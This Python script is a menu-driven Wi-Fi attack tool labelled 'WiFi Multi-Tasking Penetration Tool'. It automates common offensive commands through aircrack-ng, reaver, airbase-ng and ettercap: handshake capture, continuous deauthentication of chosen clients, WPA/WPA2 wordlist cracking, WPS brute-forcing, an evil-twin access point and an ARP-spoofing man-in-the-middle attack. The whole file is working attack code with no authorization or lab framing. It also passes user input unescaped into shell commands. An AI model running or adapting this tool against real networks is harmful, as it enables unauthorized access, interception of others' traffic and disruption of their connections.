#!/usr/bin/env python3

import subprocess

# Color codes for terminal output
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
RESET = '\033[0m'

def banner():
    print(f"""{CYAN}
    ██████████████████████████████████████████████████████████████
    █▄─▄▄─█─▄▄─█▄─█─▄█▄─▄▄─█▄─█─▄█─▄▄─█▄─█─▄█▄─▄▄─█▄─▄▄▀█▄─▄▄─█
    ██─▄█▀█─██─██▄─▄███─▄▄▄██▄─▄██─██─██▄─▄███─▄█▀██─▄─▄██─▄█▀█
    ▀▄▄▄▄▄▀▄▄▄▄▀▀▄▄▄▀▀▄▄▄▀▀▀▀▄▄▄▀▀▄▄▄▄▀▀▄▄▄▀▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀
    
    █▀▄─██─▄▄─█─▄▄▄─█▄─▄▄▀█▄─▄███─▄▄─█▄─▄▄─█▄─▄▄▀█▄─▄▄─█▄─▄▄▀█
    ██▀▄─█─██─█─███▀██─▄─▄██─██▀█─██─██─▄█▀██─▄█▀██─▄█▀██─▄─▄█
    ▀▄▄▀▄▄▀▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀

                WiFi Multi-Tasking Penetration Tool
                           by AK
    ██████████████████████████████████████████████████████████████
    {RESET}""")

def run_iwconfig():
    print(f"{YELLOW}[+] Displaying wireless interfaces with iwconfig...{RESET}")
    subprocess.call("iwconfig", shell=True)

def start_monitor_mode(interface):
    print(f"{MAGENTA}[+] Starting monitor mode on {interface}...{RESET}")
    subprocess.call(f"sudo airmon-ng start {interface}", shell=True)

def scan_networks(interface):
    print(f"{BLUE}[+] Scanning for available networks...{RESET}")
    subprocess.Popen(["gnome-terminal", "--", "bash", "-c", f"sudo airodump-ng {interface}; exec bash"])

def capture_handshake(interface, bssid, channel, output_file):
    print(f"{GREEN}[+] Capturing handshake for BSSID {bssid} on channel {channel}...{RESET}")
    subprocess.Popen(["gnome-terminal", "--", "bash", "-c", f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} {interface}; exec bash"])

def deauth_attack(interface, bssid, client_mac):
    print(f"{RED}[+] Sending deauthentication packets to {client_mac}...{RESET}")
    subprocess.Popen(["gnome-terminal", "--", "bash", "-c", f"sudo aireplay-ng --deauth 0 -a {bssid} -c {client_mac} {interface}; exec bash"])

def crack_password(capture_file, wordlist):
    print(f"{CYAN}[+] Cracking password using Aircrack-ng...{RESET}")
    subprocess.Popen(["gnome-terminal", "--", "bash", "-c", f"sudo aircrack-ng -w {wordlist} {capture_file}; exec bash"])

def wps_attack(interface, bssid):
    print(f"{MAGENTA}[+] Starting WPS attack on {bssid}...{RESET}")
    subprocess.Popen(["gnome-terminal", "--", "bash", "-c", f"sudo reaver -i {interface} -b {bssid} -vv; exec bash"])

def evil_twin_attack(interface, essid):
    print(f"{YELLOW}[+] Creating Evil Twin AP with ESSID {essid}...{RESET}")
    subprocess.Popen(["gnome-terminal", "--", "bash", "-c", f"sudo airbase-ng -e {essid} -c 6 {interface}; exec bash"])

def mitm_attack(interface, target_ip, gateway_ip):
    print(f"{BLUE}[+] Starting MITM attack...{RESET}")
    subprocess.Popen(["gnome-terminal", "--", "bash", "-c", f"echo 1 > /proc/sys/net/ipv4/ip_forward; sudo ettercap -T -q -i {interface} -M arp:remote /{target_ip}/ /{gateway_ip}/; exec bash"])

def stop_monitor_mode(interface):
    print(f"{GREEN}[+] Stopping monitor mode on {interface}...{RESET}")
    subprocess.call(f"sudo airmon-ng stop {interface}", shell=True)

def main():
    banner()
    
    # Run iwconfig first to show available interfaces
    run_iwconfig()
    
    interface = input(f"{CYAN}[?] Enter your wireless interface (e.g., wlan0): {RESET}")
    start_monitor_mode(interface)

    while True:
        print(f"""{MAGENTA}
        1. Scan Networks
        2. Capture Handshake
        3. Deauthentication Attack
        4. Crack WPA/WPA2 Password
        5. WPS Attack
        6. Evil Twin Attack
        7. MITM Attack
        8. Stop Monitor Mode and Exit
        {RESET}""")
        
        choice = input(f"{BLUE}[?] Select an option: {RESET}")
        
        if choice == "1":
            scan_networks(interface)
        elif choice == "2":
            bssid = input(f"{CYAN}[?] Enter the BSSID of the target network: {RESET}")
            channel = input(f"{CYAN}[?] Enter the channel of the target network: {RESET}")
            output_file = input(f"{CYAN}[?] Enter the output file name for the handshake capture: {RESET}")
            capture_handshake(interface, bssid, channel, output_file)
        elif choice == "3":
            bssid = input(f"{RED}[?] Enter the BSSID of the target network: {RESET}")
            client_mac = input(f"{RED}[?] Enter the client MAC address: {RESET}")
            deauth_attack(interface, bssid, client_mac)
        elif choice == "4":
            capture_file = input(f"{GREEN}[?] Enter the path to the capture file (.cap): {RESET}")
            wordlist = input(f"{GREEN}[?] Enter the path to your wordlist: {RESET}")
            crack_password(capture_file, wordlist)
        elif choice == "5":
            bssid = input(f"{MAGENTA}[?] Enter the BSSID of the target network: {RESET}")
            wps_attack(interface, bssid)
        elif choice == "6":
            essid = input(f"{YELLOW}[?] Enter the ESSID for the Evil Twin AP: {RESET}")
            evil_twin_attack(interface, essid)
        elif choice == "7":
            target_ip = input(f"{BLUE}[?] Enter the target IP address: {RESET}")
            gateway_ip = input(f"{BLUE}[?] Enter the gateway IP address: {RESET}")
            mitm_attack(interface, target_ip, gateway_ip)
        elif choice == "8":
            stop_monitor_mode(interface)
            print(f"{CYAN}[+] Exiting...{RESET}")
            break
        else:
            print(f"{RED}[!] Invalid option. Please try again.{RESET}")

if __name__ == "__main__":
    main()

